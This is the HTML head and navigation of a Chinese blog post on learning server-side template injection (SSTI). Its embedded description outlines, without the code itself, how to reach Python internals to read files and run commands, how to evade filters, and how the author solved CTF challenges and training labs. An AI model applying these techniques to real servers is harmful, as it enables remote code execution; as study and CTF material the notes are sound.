<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>ssti学习 | Sherlock</title><meta name="keywords" content="ssti,python"><meta name="author" content="Sherlock"><meta name="copyright" content="Sherlock"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="ssti学习"><meta name="application-name" content="ssti学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="ssti学习"><meta property="og:url" content="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="Sherlock"><meta property="og:description" content="常用魔术方法__class____class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 __class__ 是类的一个内置属性，表示类的类型，返回 &amp;lt;type &amp;#39;type&amp;#39;&amp;gt; ； 也是类的实例的属性，表示实例对象的类。 12345678&amp;gt;&amp;amp;g"><meta property="og:locale" content="en"><meta property="og:image" content="http://example.com/img/Sherlock.jpg"><meta property="article:author" content="Sherlock"><meta property="article:tag" content="智商不够,勤勉来凑;眼神不太好"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/Sherlock.jpg"><meta name="description" content="常用魔术方法__class____class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 __class__ 是类的一个内置属性，表示类的类型，返回 &amp;lt;type &amp;#39;type&amp;#39;&amp;gt; ； 也是类的实例的属性，表示实例对象的类。 12345678&amp;gt;&amp;amp;g"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":["🔍 分享与热心帮助","🤝 喜欢团结协作","🏃 脚踏实地行动派","💢 壮汉人狠话不多"]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: Sherlock","link":"Link: ","source":"Source: Sherlock","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Sherlock',
  title: 'ssti学习',
  postAI: '',
  pageFillDescription: '常用魔术方法, __class__, 获取基类, __subclasses__(), __builtins__, __globals__, 利用 SSTI 读取文件, Python 2, Python 3, 利用 SSTI 执行命令, 寻找内建函数 eval 执行命令, 寻找 os 模块执行命令, 寻找 popen 函数执行命令, 寻找 importlib 类执行命令, 寻找 linecache 函数执行命令, 寻找 subprocess.Popen 类执行命令, 关键字绕过, 利用字符串拼接绕过, 利用编码绕过, 利用Unicode编码绕过关键字（flask适用）, 利用Hex编码绕过关键字, 利用引号绕过, 利用join()函数绕过, 绕过其他字符, 过滤了中括号[ ], 过滤了引号, 过滤了下划线__, 过滤了点 ., 过滤了大括号, 利用 |attr() 来Bypass, 同时过滤了 . 和 [], 同时过滤了 __ 、点. 和 [], 同时过滤了 __ 、点. 和 [], 用Unicode编码配合 |attr() 进行Bypass, [2020 DASCTF 八月安恒月赛]ezflask, 过滤了request和class, [NCTF2018]flask真香, BP-Lab Basic server-side template injection(ERB模板), BP-Lab Basic server-side template injection(code context)(Tornado模板), BP-Lab Basic server-side template injection using documentation(Freemarker模板), Lab  in an unknown language with a documented exploit, Lab 服务器端模板注入通过用户提供的对象进行信息披露, Lab：沙盒环境中的服务器端模板注入常用魔术方法用来查看变量所属的类根据前面的变量形式可以得到其所属的类是类的一个内置属性表示类的类型返回也是类的实例的属性表示实例对象的类获取基类用来查看类的基类也可以使用数组索引来查看特定位置的值通过该属性可以查看该类的所有直接父类该属性返回所有直接父类组成的元组虽然只有一个元素注意是直接父类下与下不同获取基类还能用方法方法可以用来获取一个类的调用顺序比如输出结果如下在这个例子中类的顺序是这意味着在搜索方法时解释器会先在中查找然后按照的顺序依次查找父类直到找到匹配的方法或属性除此之外我们还可以利用方法获取直接基类有这些类继承的方法我们就可以从任何一个变量回溯到最顶层基类中去再获得到此基类所有实现的类就可以获得到很多的类和方法了在中是一个特殊方法也称为魔术方法或魔术属性用于获取当前类的直接子类列表当你调用一个类的方法时它会返回一个包含所有直接子类的列表这些子类是在程序运行时动态创建的因此列表的内容取决于程序执行的上下文和流程以下是一个简单的示例输出输出在这个示例中类有两个直接子类和类有一个直接子类因此调用返回的列表包含了和而调用返回的列表只包含了注意这里要记住一点和版本返回的子类不是一样的但是有的大部分都有当然我们也可以直接用会得到和上面一样的结果的主要目的就是从这么多的子类中找出可以利用的类一般是指读写文件或执行命令的类加以利用在中是一个指向内建模块的引用这个模块包含了中内置的常用函数异常和其他对象变量是一个字典包含了内建模块中所有的内置函数和对象你可以通过字典来访问这些内置函数和对象例如你可以通过来访问内置的函数或者通过来访问内置的异常类但是在实际编码中我们通常直接使用内置函数和对象的名称而不是通过来访问例如我们通常使用函数而不是需要注意的是在一些限制性的环境中比如一些解释器中或者在使用了函数时可能会限制对的直接访问在中是一个特殊属性用于访问包含当前作用域中所有全局变量的字典这个属性是一个字典它包含了当前作用域中所有全局变量的名称和对应的值在中每个作用域都有一个与之相关联的字典用于存储该作用域中的全局变量这个字典可以通过访问作用域对象的属性来获取例子如下定义一个全局变量定义一个局部变量输出全局变量字典输出全局变量的值调用函数利用读取文件在上文中我们使用方法查看子类的时候发现可以发现索引号为指向类分析如下获取空字符串的类型即类型获取类型的方法解析顺序这是一个元组包含了当前类和它的父类的顺序获取方法解析顺序中的最后一个类即类获取类的所有子类这是一个列表对获取到的子类列表进行枚举返回索引和对应的元素组成的元组遍历枚举后的元组列表并打印每个元组综上所述这段代码的作用是遍历类的所有直接子类并输出它们的索引和对应的子类此类可以直接用来读取文件使用类读取文件的方法仅限于环境在环境中类已经没有了我们可以用这个类去读取文件首先编写脚本遍历目标环境中这个类索引号得到编号为所以如下双大括号通常用于表示模板语法它们可能用于在某些框架中进行模板渲染比如在前端的或中或者在后端的像等框架中这是中创建一个空的元组并访问该元组的类元组的类是这是访问类的基类它的基类是这是获取类的基类中的第一个元素即这是获取中类的所有子类这个调用会返回一个包含所有子类的列表这是对子类对象的属性进行访问可能是希望访问第个子类对象中名为的方法这是作为参数传递给方法的值可能是为了触发某种行为利用执行命令寻找内建函数执行命令遍历目标环境中含有内建函数的子类的索引号所以随便挑一个构造为这是中的一种导入模块的方法是标准库中用于与操作系统交互的模块它包含了许多与文件和目录处理进程管理等相关的函数和方法是模块中的一个函数用于执行系统命令并返回命令的输出在这里是一个系统命令用于列出根目录下的文件和目录列表是返回的文件对象的方法用于读取文件内容寻找模块执行命令自己在靶场里面尝试失败首先编写脚本遍历目标环境中含有模块的类的索引号挑一个构造寻找函数执行命令首先编写脚本遍历目标环境中含有函数的类的索引号挑一个构造寻找类执行命令中存在类目的就是提供中语句的实现以及函数那么可以直接利用该类中的将模块导入从而使用模块执行命令首先编写脚本遍历目标环境中类的索引号构造寻找函数执行命令这个函数可用于读取任意一个文件的某一行而这个函数中也引入了模块所以可以利用这个函数去执行命令首先编写脚本遍历目标环境中含有这个函数的子类的索引号构造寻找类执行命令从版本开始可以用这个模块来产生子进程并连接到子进程的标准输入输出错误中去还可以得到子进程的返回值意在替代其他几个老的模块或者函数比如等函数首先编写脚本遍历目标环境中含有这个函数的子类的索引号构造关键字绕过利用字符串拼接绕过我们可以利用进行字符串拼接绕过关键字过滤例如只要返回的是字典类型的或是字符串格式的即中引号内的在调用的时候都可以使用字符串拼接绕过利用编码绕过我们可以利用对关键字编码的方法绕过关键字过滤例如用编码绕过等同于可以看到在中只要是字符串的即中引号内的都可以用编码绕过同理还可以进行进制编码等利用编码绕过关键字适用我们可以利用编码的方法绕过关键字过滤例如等同于利用编码绕过关键字和上面那个一样只不过将编码换成了编码适用于过滤了的情况我们可以利用编码的方法绕过关键字过滤例如等同于利用引号绕过我们可以利用引号来绕过对关键字的过滤例如过滤了那么我们可以用或的形式来绕过再如可以看到在中只要是字符串的即中引号内的都可以用引号绕过利用函数绕过我们可以利用函数来绕过关键字过滤例如题目过滤了那么我们可以用如下方法绕过绕过其他字符过滤了中括号利用绕过可以使用方法输出序列属性中的某个索引处的元素如如下示例指定序列属性指定字典属性利用绕过方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值如下示例指定序列属性指定字典属性注意最好不要用因为会删除相应位置的值除非你有相应的权限才可以利用字典读取绕过我们知道访问字典里的值有两种方法一种是把相应的键放入熟悉的方括号里来访问一种就是用点来访问所以当方括号被过滤之后我们还可以用点的方式来访问如下示例等同于过滤了引号利用绕过先获取函数赋值给后面再拼接成一个字符串等同于利用对象绕过示例只能都可以等同于如果过滤了可以将其中的改为和两种方法传递的数据都可以接收过滤了下划线利用对象绕过等同于还有一种编码绕过其中的十六进制编码为于是我们可以构造出如下的过滤了点利用绕过适用于如果也被过滤且目标是的话可以使用原生函数即示例等同于利用中括号绕过如下示例等同于这样的话那么等关键字就成了字符串就都可以用前面所讲的关键字绕过的姿势进行绕过了过滤了大括号可以使用配合和将执行结果外带不外带的话无回显出来也可以用的形式来代替大括号如下利用来这里说一个新东西就是原生函数这是一个过滤器它只查找属性获取并返回对象的属性的值过滤器与变量用管道符号分割如等同于配合其他姿势可同时绕过双下划线引号点和等下面给出示例同时过滤了和过滤了以下字符绕过姿势等同于同时过滤了点和过滤了以下字符下面我们演示绕过姿势先写出的原型由于中括号被过滤了我们可以用来绕过尽量不要用类似如下由于还过滤了下划线我们可以用对象绕过但是还过滤了中括号所以我们要同时绕过和就用到了我们的所以最终的如下同时过滤了点和过滤了以下字符下面我们演示绕过姿势先写出的原型由于中括号被过滤了我们可以用来绕过尽量不要用类似如下由于还过滤了下划线我们可以用对象绕过但是还过滤了中括号所以我们要同时绕过和就用到了我们的所以最终的如下用编码配合进行过滤了以下字符空格我们用绕过对的过滤并用绕过对关键字的过滤绕过是一种网上没提出的方法假设我们要构造的原型为先用绕过和我们可以将过滤掉的字符用替换掉用编码配合进行和上面那个一样只不过是将编码换成了编码适用于被过滤了的情况我们可以将过滤掉的字符用编码替换掉使用的过滤器进行在中内只有很多过滤器可以使用前文的就是其中的一个过滤器变量可以通过过滤器进行修改过滤器与变量之间用管道符号隔开括号中可以有可选参数也可以没有参数过滤器函数可以带括号也可以不带括号可以使用管道符号连接多个过滤器一个过滤器的输出应用于下一个过滤器详情请看官方文档以下是内置的所有的过滤器列表可以自行点击每个过滤器去查看每一种过滤器的作用我们就是利用这些过滤器一步步的拼接出我们想要的字符数字或字符串常用字符获取入口点对于获取一般字符的方法有以下几种如下演示可以通过上面获取到的字符串获取的字符有尖号字母空格下划线和数字如上图所示可以通过字符串获取的字符有尖号字母和空格可以通过上面获取到的除了字母以外还有百分号这一点比较重要因为如果我们控制了百分号的话我们可以获取任意字符可获得到的字符更多了对于获取数字除了上面出现的那几种外我们还可以有以下几种方法通过过滤器获取数字通过过滤器获取数字通过过滤器获取点得到比如得到有了数字之后我们便可以依次将其余的数字全部构造出来原理就是加减乘除平方等数学运算八月安恒月赛题目源码可以看到题目过滤的死死地最关键是把也给过滤了的话这就很麻烦了但是我们还可以用过滤器进行绕过在存在的地方执行如下或可以看到我们得到了一段字符串这段字符串中不仅存在字符还存在空格下划线尖号和数字也就是说如果题目过滤了这些字符的话我们便可以在这个字符串中取到我们想要的字符从而绕过过滤然后我们在使用过滤器将字符串转化为列表如上图所示反回了一个列表列表中是这个字符串的每一个字符接下来我们便可以使用使用等方法将列表里的字符取出来了如下所示我们取一个下划线同理还能取到更多的字符空格这里其实有了数字之后我们便可以依次将其余的数字全部构造出来原理就是加减乘除平方等数学运算如下示例注意这样的加号的是不行的不知道为什么只能用减号配合取绝对值了通过上述原理我们可以依次获得构造所需的特殊字符与字符串首先构造出所需的数字构造出所需的各种字符与字符串空格单引号左括号右括号字符百分号这里构造了之后可以利用这个构造任意字符用于字符连接使用构造斜杠使用某种格式化操作这在很多编程语言中用于将一个整数转换为其对应的字符在码表中整数对应的字符是斜杠将上面构造的字符或字符串拼接起来构造出然后将上面构造的各种变量添加到万能里面就行了所以最终的为拿去执行成功执行命令并得到了过滤了和这里除了用上面中括号或那几种方法外我们还可以利用里面的对象和对象来逃逸这一姿势下面通过的两道题目来仔细讲解真香打开题目一看是一个炫酷的演示这种一般是没有啥东西好挖的首先信息收集发现版本是没有静态服务器随便点开第二个发现了这里注意到界面是提供的界面按照以往的经验猜测这里存在注入先尝试简单的从这里可见毫无疑问的存在漏洞了那么就来康康到底有没有有的话被过滤了哪些经过一番测试确实很多东西都被过滤了而且是正则表达式直接匹配删去无法嵌套绕过不完整测试有以下从这里来看似乎已经完全无法下手了因为和都被过滤掉了卡在这里以后最好的办法就是去查官方文档了从官方文档里找到了对象经过测试没有被过滤更巧的是一定是一个对象因此我们可以通过键的方法访问相应的类由于键是一个字符串因此可以通过字符串拼接绕过访问到了类我们就可以通过来获取基类的元组带上索引就可以访问到相应的基类由此一直向上我们就可以访问到最顶层的基类了同样的如果没有过滤的话我们还可以利用来逃逸方法与的相同有了对象基类我们就可以通过访问方法再实例化去访问所有的子类同样使用字符串拼接绕过这样就实现沙箱逃逸了目的无非就是两个文件读写执行命令因此我们核心应该放在类和类而坑爹的是几乎换了个遍因此这里得去看官方文档去找相应的基类的用处我还是从库入手直接搜索找到了类同样使用键访问的方法猜大致范围得到了索引序号我这里序号是我们调用它的函数将其实例化然后用查看其全局变量眼又花了但我们的目的很明显就是要执行命令于是直接搜索就可以了由于又是一个类型我们调用的时候又可以使用字符串拼接绕过过滤后面顺理成章的我们将命令字符串传入实例化这个函数然后直接调用方法就可以了模板题目要求要解决实验问题请查看文档以了解如何执行任意代码然后从的主目录中删除该文件首先在上面搜索结果为该语法用于计算表达式并在页面上呈现结果几种基本操作如下当点击第一个商品的时候页面提示如下猜测存在漏洞于是开始尝试首先输入发现正在题目要求的目录下面于是我们执行第二个代码直接删除所需删除的文件解决题目模板题目要求请查看文档以了解如何执行任意代码然后从的主目录中删除该文件模板先进入一篇文章发表了一条评论然后登录我的账户更改网站希望使用您的全名名字或昵称更改完后刷新评论区发现名字会随着我的更改而改变存在模板注入抓包尝试一下发现评论区名字后面会跟着确认存在漏洞接着操作位于目录下继续操作删除要求的文件模板题目要求请确定模板引擎并使用文档来了解如何执行任意代码然后从的主目录中删除该文件我们先登录题目提供的账号然后进入随便一个商品滑到最下面点击修改模板英语版的进入一个页面开始修改改模板的语法是语句如果我们的语句填入的是不存在的对象保存后页面会报错从报错信息中得到改模板为于是上搜索相关漏洞当然题目要求的是自己查阅文档解决不是这样子的得到如下结果其中可用于创建实现接口的任意对象有一个名为的类可用于执行任意命令开始构造确定所处目录是于是删除要求的文件题目解决题目要求请确定模板引擎并在线查找可用于执行任意代码的文档漏洞然后从的主目录中删除该文件进入实验室后我们先点击第一个商品回显跟第一题一模一样所以现在我们需要确定使用的是哪种模板于是输入',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-03-24 21:59:00',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/Sherlock.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Sherlock</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> Search</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/cors/" style="font-size: 1.05rem;">cors<sup>1</sup></a><a href="/tags/csrf/" style="font-size: 1.05rem;">csrf<sup>1</sup></a><a href="/tags/php/" style="font-size: 1.05rem;">php<sup>5</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>3</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>3</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/ssti/" style="font-size: 1.05rem;">ssti<sup>2</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>3</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span><a class="card-more-btn" href="/archives/" title="More">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">November 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">July 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">April 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a 